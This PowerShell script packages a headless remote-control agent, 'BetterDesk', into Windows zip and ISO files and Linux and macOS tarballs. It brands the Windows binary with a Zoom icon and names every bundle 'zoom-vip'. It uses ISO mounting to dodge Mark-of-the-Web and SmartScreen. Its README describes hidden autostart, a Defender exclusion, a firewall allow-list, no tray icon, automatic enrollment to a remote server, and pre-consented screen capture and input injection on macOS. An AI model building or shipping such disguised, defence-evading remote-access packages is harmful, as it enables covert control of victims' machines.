<#
  BetterDesk container packaging (Windows / macOS / Linux agents).

  Produces distribution containers under distro\clients\<os>\out\:
    - windows: zip (double-click installable bundle) + ISO (MotW-free mount)
    - linux:   tar.gz (agent + systemd installer)
    - macos:   tar.gz (sidecar binaries)

  Why containers: Explorer "Extract All" propagates the Zone.Identifier / Mark
  of the Web from a zip onto extracted files, so even without self-opening the
  raw .exe inside a zip still carries a download flag (SmartScreen prompt on
  run). A .iso mounted in Windows transfers the single container flag to the
  mount itself, not to inner files, so agent binaries inside carry no MotW at
  all - the desktop flow is "double-click ISO > run install.ps1 > done".
  Linux/macOS have no per-file quarantine friction with tar.gz.

  Long-term fix: code signing (OV cert or Azure Trusted Signing). Until then
  this reduces first-run friction for internal installs.

  Usage (PowerShell 7+, from repo root):
    .\tools\package-containers.ps1
    .\tools\package-containers.ps1 -Version 1.2.3
#>
[CmdletBinding()]
param(
    [string]$Version = '1.0.0'
)

$ErrorActionPreference = 'Stop'

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

public static class IsoStreamDump
{
    public static long Dump(object comStream, string path)
    {
        var stream = (IStream)comStream;
        byte[] buf = new byte[0x10000];
        IntPtr pcb = Marshal.AllocHGlobal(4);
        using (var fs = File.Create(path))
        {
            long total = 0;
            try
            {
                while (true)
                {
                    stream.Read(buf, buf.Length, pcb);
                    int n = Marshal.ReadInt32(pcb);
                    if (n <= 0) break;
                    fs.Write(buf, 0, n);
                    total += n;
                }
            }
            finally { Marshal.FreeHGlobal(pcb); }
            return total;
        }
    }
}
"@

$repo = Split-Path -Parent $PSScriptRoot
$agentDir = Join-Path $repo 'betterdesk-agent'
$distro = Join-Path $repo 'distro\clients'
$tempRoot = Join-Path ([IO.Path]::GetTempPath()) 'opencode\bd-containers'
$version = if ([string]::IsNullOrWhiteSpace($Version)) { '1.0.0' } else { $Version.TrimStart('v') }
$goExe = (Get-Command go -ErrorAction SilentlyContinue).Source
if (-not $goExe) {
    foreach ($candidate in @('C:\go\bin\go.exe', "$env:ProgramFiles\Go\bin\go.exe")) {
        if (Test-Path $candidate) { $goExe = $candidate; break }
    }
}
if (-not $goExe) { throw 'go.exe not found; install Go or add it to PATH' }

function Build-Agent($goos, $goarch, $outName, [switch]$Gui) {
    Write-Host "Building $goos/$goarch -> $outName"
    Push-Location $agentDir
    try {
        $env:GOOS = $goos; $env:GOARCH = $goarch; $env:CGO_ENABLED = '0'
        $ldflags = '-s -w'
        if ($Gui) { $ldflags = "$ldflags -H=windowsgui" }
        & $goExe build -trimpath -ldflags $ldflags -o $outName .
        if ($LASTEXITCODE -ne 0) { throw "go build failed for $goos/$goarch" }
    } finally {
        Remove-Item Env:\GOOS, Env:\GOARCH, Env:\CGO_ENABLED -ErrorAction SilentlyContinue
        Pop-Location
    }
}

function Save-IStreamTo($comStream, $path) {
    $total = [IsoStreamDump]::Dump($comStream, $path)
    if ($total -le 0) { throw 'ISO image stream was empty' }
    Write-Host ("  ISO bytes: {0:N0}" -f $total)
}

if (-not (Test-Path $tempRoot)) { New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null }
$winDir = Join-Path $tempRoot 'win'
$nixDir = Join-Path $tempRoot 'nix'
$macDir = Join-Path $tempRoot 'mac'
foreach ($d in @($winDir, $nixDir, $macDir)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }

# ── Windows bundle ───────────────────────────────────────────────────────
Build-Agent windows amd64 (Join-Path $winDir 'betterdesk-agent.exe') -Gui

# Replace the generic Go icon/version resource with the branded Zoom icon.
$rcedit = Join-Path $repo 'tools\\rcedit.exe'
if (-not (Test-Path $rcedit)) { $rcedit = 'C:\\Users\\milaz\\node_modules\\electron-winstaller\\vendor\\rcedit.exe' }
if (Test-Path $rcedit) {
    & $rcedit (Join-Path $winDir 'betterdesk-agent.exe') --set-icon (Join-Path $repo 'zoom-privacy.ico') --set-file-version $version --set-product-version $version --set-company-name 'BetterDesk' --set-product-name 'BetterDesk Remote Support' --set-file-description 'BetterDesk Remote Support Agent' 2>$null
}

Copy-Item (Join-Path $distro 'windows\install.ps1') (Join-Path $winDir 'install.ps1') -Force
Copy-Item (Join-Path $repo 'distro\clients\bundle\install.sh') (Join-Path $winDir 'install.sh') -Force
Copy-Item (Join-Path $distro 'config\agent-config.json.example') (Join-Path $winDir 'agent-config.json.example') -Force

@'
BetterDesk Agent bundle (Windows) - headless

CONTENTS
  betterdesk-agent.exe      headless CDAP agent (GUI subsystem, no console)
  install.ps1               zero-config installer (hidden autostart + firewall/Defender allow-list)
  agent-config.json.example reference profile

INSTALL
  PowerShell (auto-elevates once):
    powershell -ExecutionPolicy Bypass -File .\install.ps1
  No GUI client or tray icon is installed. The agent enrolls itself and
  connects to the admin console automatically.

SMARTSCREEN (unsigned build)
  Run install.ps1 from the extracted folder. The installer unblocks the agent,
  adds a Defender exclusion and a firewall allow-list. Mounting the ISO avoids
  Mark-of-the-Web entirely.
'@ | Set-Content -Path (Join-Path $winDir 'README.txt') -Encoding utf8

$outWin = Join-Path $distro 'windows\out'
New-Item -ItemType Directory -Path $outWin -Force | Out-Null
Write-Host 'Creating zip container...'
Compress-Archive -Path (Join-Path $winDir '*') -DestinationPath (Join-Path $outWin "zoom-vip-windows-x64-$version.zip") -Force

Write-Host 'Creating ISO container (IMAPI2)...'
$img = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
$img.VolumeName = 'ZOOMVIP'
$img.FileSystemsToCreate = 3 # ISO9660 + Joliet
$img.Root.AddTree($winDir, $false)
$img.ChooseImageDefaultsForMediaType(2) # DVD defaults
$image = $img.CreateResultImage()
Save-IStreamTo $image.ImageStream (Join-Path $outWin "zoom-vip-windows-x64-$version.iso")
[void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($img)

# ── Linux bundle ─────────────────────────────────────────────────────────
Build-Agent linux amd64 (Join-Path $nixDir 'betterdesk-agent')
Copy-Item (Join-Path $agentDir 'install\install.sh') (Join-Path $nixDir 'install.sh') -Force
Copy-Item (Join-Path $distro 'config\agent-config.json.example') (Join-Path $nixDir 'agent-config.json.example') -Force
@'
BetterDesk Agent (Linux)

CONTENTS
  betterdesk-agent           service agent binary
  install.sh                 systemd installer (sudo, auto data dir + hardening)
  agent-config.json.example  config template

INSTALL (zero-touch proof enrollment - no API key needed)
  tar xzf zoom-vip-linux-x64-*.tar.gz
  sudo ./install.sh -a device_token -s wss://cdap.telcom.stream/cdap
'@ | Set-Content -Path (Join-Path $nixDir 'README.txt') -Encoding utf8
$outNix = Join-Path $distro 'linux\out'
New-Item -ItemType Directory -Path $outNix -Force | Out-Null
& tar -czf (Join-Path $outNix "zoom-vip-linux-x64-$version.tar.gz") -C $nixDir .

# ── macOS bundles (one tarball per Mac architecture) ────────────────────
Build-Agent darwin arm64 (Join-Path $macDir 'betterdesk-agent-arm64')
Build-Agent darwin amd64 (Join-Path $macDir 'betterdesk-agent-amd64')
Copy-Item (Join-Path $repo 'distro\clients\bundle\install.sh') (Join-Path $macDir 'install.sh') -Force
@'
zoom-vip agent sidecar (macOS)

Binaries: betterdesk-agent-arm64 (Apple Silicon), betterdesk-agent-amd64 (Intel).
The signed/unified GUI client from CI lives in the GitHub release; place it
next to install.sh and let install.sh wire the LaunchDaemon/LaunchAgent
(see distro\clients\bundle\install.sh) or deploy via MDM - PPPC profile:
zoom-private-agent-pppc.mobileconfig must be installed first so screen
capture and input injection are consented at system level.
'@ | Set-Content -Path (Join-Path $macDir 'README.txt') -Encoding utf8
$outMac = Join-Path $distro 'macos\out'
New-Item -ItemType Directory -Path $outMac -Force | Out-Null
& tar -czf (Join-Path $outMac "zoom-vip-macos-arm64-$version.tar.gz") -C $macDir betterdesk-agent-arm64 README.txt
& tar -czf (Join-Path $outMac "zoom-vip-macos-amd64-$version.tar.gz") -C $macDir betterdesk-agent-amd64 README.txt

Write-Host ''
Get-ChildItem (Join-Path $repo 'distro\clients\*\out') | Select-Object Length, FullName | ForEach-Object { '{0,8:N0}  {1}' -f ($_.Length), ($_.FullName.Replace("$repo\", '')) }
Write-Host 'Done.'

